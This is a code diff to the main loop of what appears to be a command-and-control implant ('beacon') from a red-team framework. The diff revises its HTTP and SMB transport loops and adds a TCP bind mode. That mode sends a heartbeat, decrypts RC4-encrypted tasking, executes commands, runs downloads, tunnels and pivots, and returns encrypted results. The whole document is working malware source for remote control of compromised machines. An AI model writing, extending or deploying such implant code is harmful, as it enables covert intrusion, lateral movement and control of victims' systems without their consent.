@@ -7,7 +7,7 @@
 
 Agent* g_Agent;
 
-#if defined(BEACON_HTTP)
+#if defined(BEACON_HTTP) 
 
 #include "ConnectorHTTP.h"
 ConnectorHTTP* g_Connector;
@@ -56,7 +56,7 @@ void AgentMain()
 
 
 		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
-			WaitMask( g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );
+			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );
 
 		g_Agent->downloader->ProcessDownloader(packerOut);			
 		g_Agent->jober->ProcessJobs(packerOut);
@@ -81,7 +81,7 @@ void AgentMain()
 
 
 
-#elif defined(BEACON_SMB)
+#elif defined(BEACON_SMB) 
 
 #include "ConnectorSMB.h"
 ConnectorSMB* g_Connector;
@@ -112,9 +112,9 @@ void AgentMain()
 
 		g_Connector->SendData(beat, beatSize);
 
-		for (int i = (g_Connector->RecvSize() <= 0); g_Connector->RecvSize() >= 0 && g_Agent->IsActive(); i = (g_Connector->RecvSize() <= 0) ) {
+		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {
 
-    		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
+    		if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
 				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
 				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
 				g_Connector->RecvClear();
@@ -142,6 +142,88 @@ void AgentMain()
 			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
 				TEB->LastErrorValue = 0;
 				break;
+			}
+		}
+
+		if (!g_Agent->IsActive()) {
+			g_Agent->commander->Exit(packerOut);
+
+			packerOut->Set32(0, packerOut->datasize());
+
+			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
+
+			g_Connector->SendData(packerOut->data(), packerOut->datasize());
+			packerOut->Clear(TRUE);
+		}
+
+		g_Connector->Disconnect();
+
+	} while (g_Agent->IsActive());
+
+	MemFreeLocal((LPVOID*)&beat, beatSize);
+
+	g_Connector->CloseConnector();
+	AgentClear(g_Agent->config->exit_method);
+}
+
+
+
+#elif defined(BEACON_TCP)
+
+#include "ConnectorTCP.h"
+ConnectorTCP* g_Connector;
+
+void AgentMain()
+{
+	if (!ApiLoad())
+		return;
+
+	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
+	*g_Agent = Agent();
+
+	g_Connector = (ConnectorTCP*)MemAllocLocal(sizeof(ConnectorTCP));
+	*g_Connector = ConnectorTCP();
+
+	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
+		return;
+
+	ULONG beatSize = 0;
+	BYTE* beat = g_Agent->BuildBeat(&beatSize);
+
+	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
+	*packerOut = Packer();
+	packerOut->Pack32(0);
+
+	do {
+		g_Connector->Listen();
+
+		g_Connector->SendData(beat, beatSize);
+
+		while (g_Connector->RecvSize() >= 0 && g_Agent->IsActive()) {
+
+			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
+				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
+				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
+				g_Connector->RecvClear();
+			}
+
+			g_Agent->downloader->ProcessDownloader(packerOut);
+			g_Agent->jober->ProcessJobs(packerOut);
+			g_Agent->proxyfire->ProcessTunnels(packerOut);
+			g_Agent->pivotter->ProcessPivots(packerOut);
+
+			if (packerOut->datasize() > 4) {
+				packerOut->Set32(0, packerOut->datasize());
+
+				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
+
+				g_Connector->SendData(packerOut->data(), packerOut->datasize());
+
+				packerOut->Clear(TRUE);
+				packerOut->Pack32(0);
+			}
+			else {
+				g_Connector->SendData(NULL, 0);
 			}
 		}
 
